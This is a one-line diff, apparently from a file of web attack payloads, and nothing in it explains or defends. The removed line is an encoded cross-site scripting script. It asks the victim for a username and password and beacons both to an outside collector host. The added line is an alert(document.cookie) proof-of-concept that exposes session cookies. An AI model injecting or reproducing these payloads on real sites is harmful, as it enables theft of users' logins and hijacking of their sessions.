@@ -1,1 +1,1 @@
-%5Cx3Cscript%5Cx3E%5Cx0A%5Cx0Au%5Cx20%5Cx3D%5Cx20prompt%5Cx28%5Cx27Username%5Cx3A%5Cx20%5Cx27%5Cx29%5Cx3B%5Cx0Ap%5Cx20%5Cx3D%5Cx20prompt%5Cx28%5Cx27Password%5Cx3A%5Cx20%5Cx27%5Cx29%5Cx3B%5Cx20%5Cx0Alink%5Cx3D%5Cx22https%5Cx3A%5Cx2F%5Cx2Fdnc.requestcatcher.com%5Cx2F%5Cx3Fq%5Cx3D%5Cx22%5Cx2Bu%5Cx2B%5Cx27%5Cx2C%5Cx27%5Cx2Bp%5Cx3B%5Cx0Anavigator.sendBeacon%5Cx28link%5Cx2C%5Cx22%5Cx22%5Cx29%5Cx0A%5Cx0A%5Cx3C%5Cx2Fscript%5Cx3E
+alert(document.cookie);
